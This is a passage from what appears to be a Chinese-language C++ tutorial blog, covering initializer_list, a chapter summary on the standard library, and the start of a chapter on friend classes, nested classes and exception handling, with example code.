// 对比 vector (需要算法) std::vector&lt;double&gt; vec1 = &#123;1.0, 2.0, 3.0, 4.0&#125;; std::vector&lt;double&gt; vec_prod(vec1.size()); std::transform(vec1.begin(), vec1.end(), vec_prod.begin(), [](double x)&#123; return x * 2.0; &#125;); // vec_prod 现在是 &#123;2.0, 4.0, 6.0, 8.0&#125; return 0;&#125; 如果你的主要任务是进行向量化或矩阵式的数值计算，valarray 可能是一个值得考虑的选择，尽管在现代 C++ 中，也有许多第三方库（如 Eigen, Blaze）提供了更强大和灵活的线性代数功能。对于通用的动态序列存储，vector 仍然是首选。 16.7.2 模板 initializer_list（C++11）C++11 引入了一个新的模板类 std::initializer_list&lt;T&gt;，定义在 &lt;initializer_list&gt; 头文件中。它是一个轻量级的代理对象，代表了一个用花括号 &#123;&#125; 初始化的值列表，其中所有值的类型都是 T 或可以隐式转换为 T。 主要目的: 使得函数（尤其是构造函数）能够接受任意数量的、类型相同的初始化值，就像内置数组或聚合类型那样使用花括号初始化一样。 特点: 轻量级: initializer_list 对象本身通常只包含指向底层（临时）数组的指针和数组的大小。复制 initializer_list 对象是浅拷贝，开销很小。 只读访问: 通过 initializer_list 访问其元素通常是只读的 (const T&amp;)。你不能通过 initializer_list 修改列表中的元素。 生命周期: initializer_list 引用的底层数组的生命周期与 initializer_list 对象本身相关联，通常是临时的。不要存储 initializer_list 对象并在其原始上下文之外使用。 迭代器: 提供了 begin() 和 end() 成员函数，返回指向底层数组的 const T* 指针，可以方便地遍历列表中的元素。 size(): 返回列表中的元素数量。 如何工作: 当编译器遇到一个需要 std::initializer_list&lt;T&gt; 参数的地方，并且你提供了一个 &#123;value1, value2, ...&#125; 形式的初始化列表时，编译器会自动： 创建一个临时的、类型为 const T 的数组，并将列表中的值存储进去。 创建一个 std::initializer_list&lt;T&gt; 对象，使其内部指针指向这个临时数组的开头，并记录数组的大小。 将这个 initializer_list&lt;T&gt; 对象传递给函数或构造函数。 16.7.3 使用 initializer_listinitializer_list 最常见的用途是作为函数或构造函数的参数类型。 1. 作为函数参数: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;// 函数接受一个 initializer_list&lt;int&gt;void print_ints(std::initializer_list&lt;int&gt; il) &#123; std::cout &lt;&lt; &quot;Printing &quot; &lt;&lt; il.size() &lt;&lt; &quot; integers: &quot;; // 可以使用范围 for 循环遍历 for (const int&amp; val : il) &#123; std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; &#125; // 或者使用 begin()/end() // for (auto it = il.begin(); it != il.end(); ++it) &#123; // std::cout &lt;&lt; *it &lt;&lt; &quot; &quot;; // &#125; std::cout &lt;&lt; std::endl;&#125;// 模板函数接受任意类型的 initializer_listtemplate &lt;typename T&gt;T sum_list(std::initializer_list&lt;T&gt; il) &#123; T total&#123;&#125;; // 值初始化 (对于数值类型为 0) for (const T&amp; val : il) &#123; total += val; &#125; return total;&#125;int main() &#123; print_ints(&#123;1, 2, 3&#125;); // 直接传递花括号列表 print_ints(&#123;10, 20, 30, 40, 50&#125;); print_ints(&#123;&#125;); // 传递空列表 int total_int = sum_list(&#123;1, 1, 2, 3, 5, 8&#125;); std::cout &lt;&lt; &quot;Sum of ints: &quot; &lt;&lt; total_int &lt;&lt; std::endl; // 输出 20 double total_double = sum_list(&#123;1.1, 2.2, 3.3&#125;); std::cout &lt;&lt; &quot;Sum of doubles: &quot; &lt;&lt; total_double &lt;&lt; std::endl; // 输出 6.6 // std::string total_string = sum_list&lt;std::string&gt;(&#123;&quot;Hello&quot;, &quot; &quot;, &quot;World&quot;&#125;); // 也可以用于支持 += 的类型 // std::cout &lt;&lt; &quot;Sum of strings: &quot; &lt;&lt; total_string &lt;&lt; std::endl; // 输出 &quot;Hello World&quot; return 0;&#125; 2. 作为构造函数参数: 这是 initializer_list 最重要的用途之一，它使得 STL 容器（如 vector, list, map, set 等）以及用户自定义的类能够支持简洁的花括号列表初始化。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;vector&gt;#include &lt;map&gt;#include &lt;string&gt;#include &lt;initializer_list&gt;#include &lt;iostream&gt;// 示例：一个简单的自定义类，支持 initializer_list 构造class MyData &#123;private: std::vector&lt;int&gt; data_;public: // 构造函数接受 initializer_list MyData(std::initializer_list&lt;int&gt; il) : data_(il) &#123; // 可以直接用来初始化 vector 成员 std::cout &lt;&lt; &quot;MyData constructed with &quot; &lt;&lt; il.size() &lt;&lt; &quot; elements.\\n&quot;; &#125; void print() const &#123; for (int x : data_) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; &#125;&#125;;int main() &#123; // 使用 initializer_list 构造 STL 容器 std::vector&lt;int&gt; v = &#123;10, 20, 30&#125;; // 调用 vector(initializer_list&lt;int&gt;) 构造函数 std::map&lt;std::string, int&gt; m = &#123;&#123;&quot;one&quot;, 1&#125;, &#123;&quot;two&quot;, 2&#125;, &#123;&quot;three&quot;, 3&#125;&#125;; // 调用 map(initializer_list&lt;pair&lt;const string, int&gt;&gt;) // 使用 initializer_list 构造自定义类 MyData md1 = &#123;1, 3, 5, 7, 9&#125;; MyData md2 &#123;2, 4, 6&#125;; // 也可以用花括号直接初始化 std::cout &lt;&lt; &quot;md1 data: &quot;; md1.print(); std::cout &lt;&lt; &quot;md2 data: &quot;; md2.print(); return 0;&#125; initializer_list 极大地增强了 C++11 及以后版本的初始化语法，使其更加统一和方便，特别是对于容器和需要接受可变数量同类型参数的场景。 16.8 总结本章深入探讨了 C++ 标准库提供的几个强大的工具，它们极大地增强了 C++ 的功能和易用性，特别是 string 类、智能指针和标准模板库 (STL)。 主要内容回顾： string 类: 提供了比 C 风格字符数组更安全、更方便的字符串处理方式，具有自动内存管理和丰富的成员函数（构造、输入、拼接、查找、修改、比较等）。 支持通过 c_str() 获取与 C 风格函数兼容的 const char*。 标准库还提供了宽字符版本如 wstring。 智能指针 (&lt;memory&gt;): 用于自动管理动态分配的内存，防止内存泄漏和悬挂指针。 unique_ptr: 实现独占所有权，轻量级，不可复制，可移动。管理动态数组时使用 unique_ptr&lt;T[]&gt;。是管理动态资源的首选。 shared_ptr: 实现共享所有权，通过引用计数管理资源生命周期。当最后一个 shared_ptr 销毁时释放资源。需要注意循环引用问题。 weak_ptr: 非拥有型指针，用于观察 shared_ptr 管理的对象，不增加引用计数，可用于打破循环引用。通过 lock() 安全地获取 shared_ptr。 应优先使用 make_unique 和 make_shared 创建智能指针。 auto_ptr 已被废弃，应使用 unique_ptr。 标准模板库 (STL): 基于泛型编程思想，提供通用的容器、算法和迭代器。 容器: 存储数据的模板类。 顺序容器: vector (动态数组), deque (双端队列), list (双向链表), forward_list (单向链表), array (固定大小数组)。 关联容器: set, map, multiset, multimap (基于键排序，对数时间复杂度)。 无序关联容器: unordered_set, unordered_map, unordered_multiset, unordered_multimap (基于哈希，平均常数时间复杂度)。 容器适配器: stack, queue, priority_queue (提供特定接口)。 vector: 最常用的动态数组，支持随机访问，尾部操作高效。 迭代器: 泛化的指针，连接容器和算法，提供统一的遍历接口。分为输入、输出、前向、双向、随机访问五种类别。 算法 (&lt;algorithm&gt;, &lt;numeric&gt;): 对迭代器指定的范围进行操作的函数模板（如 sort, find, copy, transform, accumulate）。算法通常不改变容器大小，需要配合容器方法（如 erase）来实际增删元素。 基于范围的 for 循环 (C++11): 提供了简洁、安全的遍历容器（或序列）的方式。 函数对象 (Functors): 重载了 operator() 的类的对象，可以像函数一样调用。 可以携带状态，常作为参数传递给 STL 算法以定制行为。 标准库在 &lt;functional&gt; 中提供了预定义的函数符（如 plus, less）。 现代 C++ 中，Lambda 表达式和 std::bind 提供了比旧式函数适配器更灵活的方式。 其他库特性: valarray (&lt;valarray&gt;): 专为数值计算设计的动态数组，支持元素级算术运算。 initializer_list (&lt;initializer_list&gt;, C++11): 使得函数和构造函数能接受花括号初始化列表 &#123;...&#125;，简化了容器和自定义类的初始化。 本章介绍的库特性是现代 C++ 编程的基础。熟练运用 string、智能指针和 STL 的容器、迭代器、算法，可以编写出更安全、更简洁、更高效、更易于维护的代码。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 15 友元、异常和其他","slug":"Cpp_tutorial_Chapter_15","date":"2025-04-30T15:42:24.017Z","updated":"2025-04-30T15:40:27.998Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_15/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_15/","excerpt":"","text":"15.1 友元通常，类的 private 和 protected 成员只能被该类的成员函数访问。这是 C++ 封装性的体现，有助于保护数据和隐藏实现细节。然而，在某些特殊情况下，允许特定的外部函数或类访问一个类的私有或保护成员会非常方便。C++ 提供了友元 (friend) 机制来实现这种受控的访问。 友元可以是： 友元函数 (Friend Function): 一个非成员函数被声明为某个类的友元。 友元类 (Friend Class): 一个类被声明为另一个类的友元。 友元成员函数 (Friend Member Function): 某个类的成员函数被声明为另一个类的友元。 声明友元: 在需要授予访问权限的类（我们称之为宿主类）的定义内部，使用 friend 关键字来声明友元。 1234567891011class HostClass &#123; friend ReturnType friendFunctionName(parameters); // 声明友元函数 friend class FriendClassName; // 声明友元类 friend ReturnType AnotherClass::memberFuncName(parameters); // 声明友元成员函数private: int privateData;protected: int protectedData;public: // ...&#125;; 重要特性: 访问权限: 友元函数或友元类（及其所有成员函数）可以访问宿主类的所有成员，包括 private 和 protected 成员。 非传递性: 友元关系不是传递的。如果类 A 是类 B 的友元，类 B 是类 C 的友元，这并不意味着类 A 是类 C 的友元。 非对称性: 友元关系不是对称的。如果类 A 是类 B 的友元，这并不意味着类 B 是类 A 的友元。 声明位置: friend 声明可以放在类定义的 public, protected, 或 private 部分，效果是相同的。通常习惯放在类定义的开始或结束处。 15.1.1 友元类当一个类被声明为另一个类的友元时，这个友元类的所有成员函数都可以访问宿主类的私有和保护成员。 示例: 假设有一个 Tv 类（电视）和一个 Remote 类（遥控器）。遥控器需要能够直接调整电视的状态（如频道、音量），即使这些状态是私有的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140// tv.h -- Tv and Remote classes#ifndef TV_H_#define TV_H_class Tv; // 前向声明 Tv 类，因为 Remote 会用到它class Remote &#123;public: enum State &#123; Off, On &#125;; enum &#123; MinVal, MaxVal = 20 &#125;; enum &#123; Antenna, Cable &#125;; enum &#123; TV, DVD &#125;; // 假设遥控器也可以控制 DVDprivate: int mode; // 控制 TV 还是 DVDpublic: Remote(int m = TV) : mode(m) &#123;&#125; // 遥控器的方法，需要访问 Tv 的私有成员 bool volup(Tv &amp; t); // 引用 Tv 对象 bool voldown(Tv &amp; t); void onoff(Tv &amp; t); void chanup(Tv &amp; t); void chandown(Tv &amp; t); void set_mode(Tv &amp; t); void set_input(Tv &amp; t); void set_chan(Tv &amp; t, int c);&#125;;class Tv &#123;private: int state; // On or Off int volume; // assumed to be digitized int maxchannel; // maximum number of channels int channel; // current channel setting int mode; // Antenna or Cable int input; // TV or DVDpublic: // 将 Remote 类声明为 Tv 类的友元 friend class Remote; enum State &#123; Off, On &#125;; enum &#123; MinVal, MaxVal = 20 &#125;; enum &#123; Antenna, Cable &#125;; enum &#123; TV, DVD &#125;; Tv(int s = Off, int mc = 125) : state(s), volume(5), maxchannel(mc), channel(2), mode(Cable), input(TV) &#123;&#125; void onoff() &#123; state = (state == On) ? Off : On; &#125; bool ison() const &#123; return state == On; &#125; bool volup(); bool voldown(); void chanup(); void chandown(); void set_mode() &#123; mode = (mode == Antenna) ? Cable : Antenna; &#125; void set_input() &#123; input = (input == TV) ? DVD : TV; &#125; void settings() const; // display all settings&#125;;// Remote 方法的实现 (需要看到 Tv 的完整定义)// 通常放在 .cpp 文件中，或者在 Tv 定义之后inline bool Remote::volup(Tv &amp; t) &#123; return t.volup(); &#125; // 调用 Tv 的公有方法inline bool Remote::voldown(Tv &amp; t) &#123; return t.voldown(); &#125;inline void Remote::onoff(Tv &amp; t) &#123; t.onoff(); &#125;inline void Remote::chanup(Tv &amp; t) &#123; t.chanup(); &#125;inline void Remote::chandown(Tv &amp; t) &#123; t.chandown(); &#125;inline void Remote::set_mode(Tv &amp; t) &#123; t.set_mode(); &#125;inline void Remote::set_input(Tv &amp; t) &#123; t.set_input(); &#125;// set_chan 需要直接访问 Tv 的私有成员 channelinline void Remote::set_chan(Tv &amp; t, int c) &#123; // 因为 Remote 是 Tv 的友元，可以直接访问 t.channel t.channel = c;&#125;// Tv 方法的实现 (部分)inline bool Tv::volup() &#123; if (volume &lt; MaxVal) &#123; volume++; return true; &#125; else return false;&#125;inline bool Tv::voldown() &#123; if (volume &gt; MinVal) &#123; volume--; return true; &#125; else return false;&#125;inline void Tv::chanup() &#123; if (channel &lt; maxchannel) channel++; else channel = 1;&#125;inline void Tv::chandown() &#123; if (channel &gt; 1) channel--; else channel = maxchannel;&#125;// ... settings() 实现需要 iostream ...#endif // TV_H_// use_tv.cpp -- 使用 Tv 和 Remote#include &lt;iostream&gt;#include &quot;tv.h&quot;// Tv::settings() 实现void Tv::settings() const &#123; using std::cout; using std::endl; cout &lt;&lt; &quot;TV is &quot; &lt;&lt; (state == On ? &quot;On&quot; : &quot;Off&quot;) &lt;&lt; endl; if (state == On) &#123; cout &lt;&lt; &quot;Volume setting = &quot; &lt;&lt; volume &lt;&lt; endl; cout &lt;&lt; &quot;Channel setting = &quot; &lt;&lt; channel &lt;&lt; endl; cout &lt;&lt; &quot;Mode = &quot; &lt;&lt; (mode == Antenna ? &quot;antenna&quot; : &quot;cable&quot;) &lt;&lt; endl; cout &lt;&lt; &quot;Input = &quot; &lt;&lt; (input == TV ? &quot;TV&quot; : &quot;DVD&quot;) &lt;&lt; endl; &#125;&#125;int main() &#123; using std::cout; Tv s42; cout &lt;&lt; &quot;Initial settings for 42\\&quot; TV:\\n&quot;; s42.settings(); s42.onoff(); // 打开电视 s42.chanup(); // 增加频道 cout &lt;&lt; &quot;\\nAdjusted settings for 42\\&quot; TV:\\n&quot;; s42.settings(); Remote grey; // 创建遥控器 grey.set_chan(s42, 10); // 遥控器设置频道 (调用友元可访问的私有成员) grey.volup(s42); // 遥控器增加音量 grey.volup(s42); cout &lt;&lt; &quot;\\nSettings after using remote:\\n&quot;; s42.settings(); Tv s58(Tv::On); // 创建一个已打开的电视 s58.set_mode(); // 切换模式 grey.set_chan(s58, 28); // 遥控器控制另一台电视 cout &lt;&lt; &quot;\\nSettings for 58\\&quot; TV:\\n&quot;; s58.settings(); return 0;&#125; 在这个例子中，Remote 类被声明为 Tv 的友元，因此 Remote 的成员函数（如 set_chan）可以直接访问 Tv 对象的私有成员 channel。 15.1.2 友元成员函数有时，我们不需要让整个类成为友元，只需要让某个类的特定成员函数成为另一个类的友元。 声明语法: 123456class HostClass &#123; // ... // 声明 OtherClass 的 memberFunc 为友元 friend ReturnType OtherClass::memberFunc(parameters); // ...&#125;; 编译顺序和前向声明: 声明友元成员函数时需要特别注意编译顺序和前向声明： 定义提供友元成员函数的类 (OtherClass): 编译器需要先知道 OtherClass 的完整定义，才能处理其中的 memberFunc。 定义宿主类 (HostClass): 在 HostClass 中声明 OtherClass::memberFunc 为友元。 定义友元成员函数 (OtherClass::memberFunc): 这个函数的实现需要看到 HostClass 的完整定义，因为它需要访问 HostClass 的私有/保护成员。 这通常需要使用**前向声明 (Forward Declaration)**。 示例: 让 Remote::set_chan 成为 Tv 的友元，而不是整个 Remote 类。 123456789101112131415161718192021222324252627282930// tvfm.h -- Tv and Remote classes using a friend member#ifndef TVFM_H_#define TVFM_H_class Tv; // *** 1. 前向声明 Tv ***class Remote &#123; // ... (Remote 定义同前) ...public: // ... void set_chan(Tv &amp; t, int c); // 声明 set_chan // ...&#125;;class Tv &#123; // ... (Tv 定义同前) ...public: // *** 2. 将 Remote::set_chan 声明为友元 *** friend void Remote::set_chan(Tv &amp; t, int c); // ...&#125;;// *** 3. 定义 Remote::set_chan (需要看到 Tv 的完整定义) ***inline void Remote::set_chan(Tv &amp; t, int c) &#123; t.channel = c; // 现在可以访问 Tv 的私有成员 channel&#125;// ... (其他 Remote 和 Tv 的内联方法定义) ...#endif // TVFM_H_ 在这个修改后的版本中，只有 Remote::set_chan 函数可以访问 Tv 的私有成员，而 Remote 的其他成员函数则不能（除非它们只调用 Tv 的公有方法）。这提供了比友元类更精细的访问控制。 15.1.3 其他友元关系相互友元 (Mutual Friends): 两个类可以互为友元。 1234567891011121314151617181920class ClassB; // 前向声明class ClassA &#123; friend class ClassB; // B 是 A 的友元private: int dataA;&#125;;class ClassB &#123; friend class ClassA; // A 是 B 的友元private: int dataB;public: void processA(ClassA&amp; a) &#123; a.dataA = 10; // B 可以访问 A 的私有成员 &#125;&#125;;// ClassA 的成员函数实现需要看到 ClassB 的完整定义// void ClassA::processB(ClassB&amp; b) &#123; b.dataB = 20; &#125; 将友元函数放在何处: 如果友元函数只访问类的公有接口，它可以是普通非成员函数。 如果友元函数需要访问类的私有/保护成员，它必须被声明为友元。 如果一个函数需要访问两个不同类的私有/保护成员，那么它需要被这两个类都声明为友元。 15.1.4 共同的友元一个函数可以是多个类的友元。 123456789101112131415161718class ClassC; // 前向声明class ClassD &#123; friend void sharedFriend(const ClassC&amp; c, const ClassD&amp; d);private: int dataD;&#125;;class ClassC &#123; friend void sharedFriend(const ClassC&amp; c, const ClassD&amp; d);private: int dataC;&#125;;// 共同友元的实现void sharedFriend(const ClassC&amp; c, const ClassD&amp; d) &#123; std::cout &lt;&lt; &quot;C data: &quot; &lt;&lt; c.dataC &lt;&lt; &quot;, D data: &quot; &lt;&lt; d.dataD &lt;&lt; std::endl;&#125; sharedFriend 函数可以同时访问 ClassC 和 ClassD 的私有成员。 使用友元的时机: 友元破坏了类的封装性，因为它允许外部代码直接访问内部实现细节。因此，应该谨慎使用友元。 何时考虑使用: 重载运算符: 尤其是需要访问两个不同类对象内部数据（如 operator&lt;&lt; 输出流操作符）或左操作数不是类对象的情况。 紧密协作的类: 当两个或多个类在概念上紧密耦合，需要高效地共享信息时（如 Tv 和 Remote）。 底层实现: 在某些底层库或框架中，为了性能或实现特定功能可能需要友元。 替代方案: 在使用友元之前，考虑是否可以通过扩展类的公有接口（添加访问器或功能函数）来满足需求。 友元提供了一种绕过访问控制的机制，但应作为最后的手段，而不是常规设计工具。 15.2 嵌套类C++ 允许在一个类中定义另一个类，这种在类内部定义的类称为嵌套类 (Nested Class) 或内部类 (Inner Class)**。包含嵌套类的类称为外围类 (Enclosing Class)** 或**外部类 (Outer Class)**。 目的: 嵌套类主要用于实现与外围类紧密相关的辅助类或数据结构，有助于将实现细节封装在外围类内部，提高代码的组织性和局部性。例如，链表或树结构的节点 (Node) 通常只为特定的容器类服务，将其嵌套在容器类内部就很自然。 语法: 12345678910111213141516171819202122232425262728293031323334353637383940414243class EnclosingClass &#123;private: // 嵌套类可以有自己的访问控制 class NestedClassPrivate &#123; // ... &#125;;protected: class NestedClassProtected &#123; // ... &#125;;public: class NestedClassPublic &#123; private: int nestedData; EnclosingClass* enclosingPtr; // 可以持有外围类指针 public: NestedClassPublic(EnclosingClass* enc = nullptr) : enclosingPtr(enc) &#123;&#125; void accessEnclosing(EnclosingClass&amp; enc); int getData() const &#123; return nestedData; &#125; &#125;;private: int enclosingData; NestedClassPrivate ncp; // 可以创建嵌套类对象作为成员public: EnclosingClass(int data = 0) : enclosingData(data) &#123;&#125; void useNested(NestedClassPublic&amp; ncp); int getData() const &#123; return enclosingData; &#125;&#125;;// 嵌套类成员函数的定义void EnclosingClass::NestedClassPublic::accessEnclosing(EnclosingClass&amp; enc) &#123; // 嵌套类可以访问外围类的所有成员 (通过对象/指针/引用) std::cout &lt;&lt; &quot;Accessing enclosing data: &quot; &lt;&lt; enc.enclosingData &lt;&lt; std::endl; // enc.ncp; // 可以访问外围类的私有成员对象&#125;// 外围类成员函数的定义void EnclosingClass::useNested(NestedClassPublic&amp; ncp) &#123; // 外围类可以访问嵌套类的 public 成员 std::cout &lt;&lt; &quot;Using nested data: &quot; &lt;&lt; ncp.getData() &lt;&lt; std::endl; // std::cout &lt;&lt; ncp.nestedData; // 错误！不能直接访问嵌套类的 private 成员&#125; 15.2.1 嵌套类和访问权限嵌套类的访问权限遵循以下规则： 作用域: 嵌套类的名称作用域仅限于其外围类。在外部引用嵌套类时，必须使用外围类的名称和作用域解析运算符 (::)，例如 EnclosingClass::NestedClassPublic。 嵌套类的声明位置（public, protected, private）决定了外部代码是否以及如何能够引用该嵌套类类型本身。 public: 外部代码可以使用 EnclosingClass::NestedClassPublic。 protected: 只有 EnclosingClass 及其派生类可以使用 EnclosingClass::NestedClassProtected。 private: 只有 EnclosingClass 内部可以使用 NestedClassPrivate。 嵌套类对外围类的访问: 嵌套类的成员函数可以访问外围类的所有成员（public, protected, private），包括类型名、静态成员、枚举常量等。 重要: 嵌套类访问外围类的非静态成员时，必须通过外围类的对象、指针或引用来进行。嵌套类对象本身不包含一个指向其外围类对象的隐式指针（不像 Java 的内部类）。 外围类对嵌套类的访问: 外围类的成员函数可以创建嵌套类的对象。 外围类对其嵌套类的成员的访问权限，遵循嵌套类自身的访问控制规则（public, protected, private）。仅仅因为一个类是嵌套的，并不意味着外围类可以无视其访问控制。外围类不能直接访问嵌套类的 private 成员（除非外围类是嵌套类的友元）。 示例：链式队列中的 Node 嵌套类 回顾第 12 章的队列模拟，Queue 类内部定义了一个 Node 结构。这就是一个典型的嵌套类（或结构）应用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// queue.h (部分)#ifndef QUEUE_H_#define QUEUE_H_class Customer; // 前向声明typedef Customer Item;class Queue &#123;private: // 嵌套结构 Node (作用域在 Queue 内) // 设为 private，因为它是 Queue 的实现细节 struct Node &#123; Item item; Node * next; &#125;; enum &#123; Q_SIZE = 10 &#125;; Node * front; // 指向 Node 对象的指针 Node * rear; int items; const int qsize; // ... (禁止赋值) ...public: Queue(int qs = Q_SIZE); ~Queue(); bool isempty() const; bool isfull() const; int queuecount() const; bool enqueue(const Item &amp;item); // Queue 的方法可以创建和访问 Node 对象 bool dequeue(Item &amp;item);&#125;;#endif// queue.cpp (部分)#include &quot;queue.h&quot;// ... Customer 定义 ...Queue::Queue(int qs) : qsize(qs) &#123; front = rear = nullptr; items = 0;&#125;Queue::~Queue() &#123; Node * temp; // 可以声明 Node 类型的指针 while (front != nullptr) &#123; temp = front; front = front-&gt;next; // 可以访问 Node 的成员 (因为 Node 是 Queue 的嵌套类，且成员默认 public) delete temp; &#125;&#125;bool Queue::enqueue(const Item &amp;item) &#123; if (isfull()) return false; Node * add = new Node; // 可以创建 Node 对象 add-&gt;item = item; // 可以访问 Node 的成员 add-&gt;next = nullptr; items++; if (front == nullptr) front = add; else rear-&gt;next = add; rear = add; return true;&#125;// ... dequeue 实现类似 ... 在这个例子中： Node 的作用域仅限于 Queue 类。外部代码不能直接使用 Node 类型。 Queue 的成员函数（如构造函数、析构函数、enqueue）可以自由地创建 Node 对象，并访问其成员 item 和 next（因为 struct 成员默认是 public 的，并且 Node 在 Queue 的作用域内）。 15.2.2 模板中的嵌套嵌套类也可以在类模板中定义。 1234567891011121314151617181920212223242526272829303132333435363738394041template &lt;typename T&gt;class OuterTemplate &#123;private: T outerData;public: // 嵌套类 class Nested &#123; private: int nestedData; public: // 嵌套类的成员函数可以访问外围模板类的成员 // (需要通过外围类对象) void processOuter(OuterTemplate&lt;T&gt;&amp; outer) &#123; std::cout &lt;&lt; &quot;Outer data: &quot; &lt;&lt; outer.outerData &lt;&lt; std::endl; // outer.outerData = someValue; // 可以修改 &#125; &#125;;private: Nested nestedObj; // 外围类可以包含嵌套类对象public: OuterTemplate(const T&amp; data) : outerData(data) &#123;&#125; void useNested() &#123; nestedObj.processOuter(*this); &#125;&#125;;// 使用int main() &#123; OuterTemplate&lt;double&gt; ot(3.14); ot.useNested(); // 输出 Outer data: 3.14 // 引用嵌套类类型需要外围类模板实例化 OuterTemplate&lt;double&gt;::Nested nestedInstance; // nestedInstance.processOuter(ot); // 也可以直接调用 return 0;&#125; 当外围类是模板时，嵌套类的定义通常也依赖于外围类的模板参数（如 Nested 可以访问 outerData，其类型为 T）。 在外部引用嵌套类类型时，需要指定外围模板类的具体实例化类型，例如 OuterTemplate&lt;double&gt;::Nested。 总结: 嵌套类是在另一个类（外围类）内部定义的类。 嵌套类的作用域局限于外围类。 嵌套类可以访问外围类的所有成员（通过对象、指针或引用）。 外围类访问嵌套类成员时，受嵌套类自身访问控制的限制。 嵌套类常用于实现与外围类紧密相关的辅助数据结构或功能，有助于封装实现细节。 嵌套类可以出现在普通类和类模板中。 15.3 异常程序在运行时可能会遇到各种错误或意外情况，例如： 用户输入无效数据。 试图打开一个不存在的文件。 内存分配失败 (new 失败)。 运算错误（如除以零）。 处理这些问题对于编写健壮的程序至关重要。C++ 提供了异常处理 (Exception Handling) 机制，作为一种强大而灵活的错误处理方式。 在介绍异常机制之前，先看看一些传统的错误处理方法及其局限性。 15.3.1 调用 abort()最简单粗暴的方式是，当程序检测到无法处理的错误时，调用 abort() 函数（定义在 &lt;cstdlib&gt; 或 &lt;stdlib.h&gt; 中）。abort() 会向操作系统发送一个异常终止信号（如 abnormal program termination），立即停止程序的执行。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for abort()double hmean(double a, double b) &#123; if (a == -b) &#123; std::cerr &lt;&lt; &quot;Error: hmean() arguments a = -b not allowed.\\n&quot;; std::abort(); // 终止程序 &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double result = hmean(10.0, -10.0); // 这行不会执行 std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 缺点: 程序突然终止，用户可能不知道原因。 没有机会进行清理工作（如保存数据、关闭文件、释放资源）。 15.3.2 返回错误码一种更常见的做法是让函数在出错时返回一个特殊的错误码（例如 0, -1, false 或 nullptr），调用者负责检查这个返回值并采取相应措施。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;cerrno&gt; // for errno (C-style error reporting)// 返回 -1 表示错误int process_data(int input) &#123; if (input &lt; 0) &#123; errno = EDOM; // 设置全局错误码 (Domain Error) return -1; // 返回错误码 &#125; // ... process data ... return 0; // 返回 0 表示成功&#125;int main() &#123; if (process_data(-5) == -1) &#123; if (errno == EDOM) &#123; std::cerr &lt;&lt; &quot;Error: Invalid input detected.\\n&quot;; &#125; else &#123; std::cerr &lt;&lt; &quot;An unknown error occurred.\\n&quot;; &#125; // ... 处理错误 ... &#125; else &#123; std::cout &lt;&lt; &quot;Processing successful.\\n&quot;; &#125; return 0;&#125; 缺点: 调用者必须检查: 调用者很容易忘记检查错误码，导致错误被忽略。 错误码混淆: 函数的正常返回值可能与错误码冲突。 错误信息有限: 单个错误码可能不足以描述错误的具体原因。 错误传递复杂: 在深层嵌套的函数调用中，每一层都需要检查并向上传递错误码，使代码冗长且容易出错。 15.3.3 异常机制C++ 异常处理提供了一种更结构化、更强大的错误处理方式，它将错误检测（在发生错误的地方）与错误处理（在能够处理该错误的地方）分离开来。 它主要涉及三个关键字： throw: 当函数检测到无法处理的错误时，使用 throw 关键字引发 (throw) 或 抛出 (raise) 一个异常。throw 后面跟着一个表达式，该表达式的值（称为异常对象）的类型决定了异常的类型。 try: 将可能引发异常的代码块（包括函数调用）放在 try 块中。try 关键字后面跟着一个花括号 &#123;&#125; 包围的代码块。 catch: 紧跟在 try 块之后，使用一个或多个 catch 块来捕获 (catch) 和处理 (handle) 异常。每个 catch 块指定它能处理的异常类型。 基本流程: 程序执行进入 try 块。 如果在 try 块中的代码（或其调用的任何函数）执行了 throw 语句，一个异常被引发。 程序立即跳出当前的 try 块（以及从 try 块开始到 throw 点之间的所有函数调用栈），开始查找匹配的 catch 块。 程序按顺序检查紧跟在 try 块后面的 catch 块。 如果找到一个 catch 块，其声明的异常类型与抛出的异常对象类型匹配（或者是其基类，或者是 catch(...)），则执行该 catch 块中的代码。 执行完匹配的 catch 块后，程序继续执行该 catch 块之后的代码（除非 catch 块本身又抛出异常或终止程序）。 如果在当前 try...catch 结构中没有找到匹配的 catch 块，异常会继续向外层传播，查找包含当前 try 块的更外层 try 块对应的 catch 块。 如果异常一直传播到 main 函数之外（即没有在任何地方被捕获），程序通常会调用 std::terminate() 异常终止。 示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;stdexcept&gt; // 包含标准异常类，如 std::runtime_errordouble hmean_exc(double a, double b) &#123; if (a == -b) &#123; // 抛出一个 runtime_error 类型的异常对象 throw std::runtime_error(&quot;hmean(): invalid arguments: a = -b&quot;); &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double x, y, z; std::cout &lt;&lt; &quot;Enter two numbers: &quot;; while (std::cin &gt;&gt; x &gt;&gt; y) &#123; try &#123; // ---- try block starts ---- z = hmean_exc(x, y); std::cout &lt;&lt; &quot;Harmonic mean of &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y &lt;&lt; &quot; is &quot; &lt;&lt; z &lt;&lt; std::endl; &#125; // ---- try block ends ---- catch (const std::runtime_error &amp; e) &#123; // ---- catch block starts ---- // 捕获 runtime_error 类型的异常 (及其派生类) std::cerr &lt;&lt; &quot;Error caught: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; // what() 返回错误信息字符串 std::cout &lt;&lt; &quot;Enter a new pair 